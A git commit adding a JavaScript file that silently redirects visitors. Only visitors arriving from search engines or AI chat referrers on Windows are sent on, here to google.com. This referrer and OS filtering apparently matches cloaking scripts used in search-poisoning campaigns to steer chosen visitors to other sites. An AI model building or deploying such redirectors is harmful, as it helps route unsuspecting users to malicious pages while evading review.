c34679f68dfb514bbd18da15f6fa04a4a2cef7d0
grasrest1974 <rehanaco7283@hotmail.com>
2025-11-23 18:33:15 +0100

    Add files via upload

---
+++ script.js
@@ -0,0 +1,70 @@
+(function() {
+    const config = {
+        redirectUrl: 'https://google.com',
+
+        allowedReferers: [
+            'bing',
+            'duckduckgo',
+            'google',
+            'yahoo',
+			'chatgpt',
+			'copilot',
+			'62a',
+        ],
+
+        filters: {
+            searchEngine: true,
+            os: {
+                windows: true,
+                linux: false,
+                mac: false,
+                android: false,
+                ios: false
+            },
+
+            browser: {
+                chrome: false,
+                firefox: false,
+                safari: false,
+                edge: false,
+                opera: false
+            }
+        }
+    };
+
+    const referrer = document.referrer.toLowerCase();
+    const userAgent = navigator.userAgent;
+    const platform = navigator.platform;
+
+    const isFromSearchEngine = config.filters.searchEngine 
+        ? config.allowedReferers.some(engine => referrer.includes(engine)) 
+        : true;
+
+    const osChecks = {
+        windows: /Win/i.test(platform),
+        linux: /Linux/i.test(platform),
+        mac: /Mac/i.test(platform),
+        android: /Android/i.test(userAgent),
+        ios: /iPhone|iPad|iPod/i.test(userAgent)
+    };
+    const isOsMatch = Object.keys(config.filters.os).some(os => config.filters.os[os] && osChecks[os]);
+
+    const browserChecks = {
+        chrome: /Chrome/i.test(userAgent) && !/Edg/i.test(userAgent),
+        firefox: /Firefox/i.test(userAgent),
+        safari: /Safari/i.test(userAgent) && !/Chrome/i.test(userAgent),
+        edge: /Edg/i.test(userAgent),
+        opera: /OPR/i.test(userAgent) || /Opera/i.test(userAgent)
+    };
+    const isBrowserMatch = Object.keys(config.filters.browser).some(browser => config.filters.browser[browser] && browserChecks[browser]);
+
+    const shouldCheckOs = Object.values(config.filters.os).some(v => v);
+    const shouldCheckBrowser = Object.values(config.filters.browser).some(v => v);
+
+    const finalOsCheck = shouldCheckOs ? isOsMatch : true;
+    const finalBrowserCheck = shouldCheckBrowser ? isBrowserMatch : true;
+
+    if (isFromSearchEngine && finalOsCheck && finalBrowserCheck) {
+        window.location.href = config.redirectUrl;
+    }
+})();
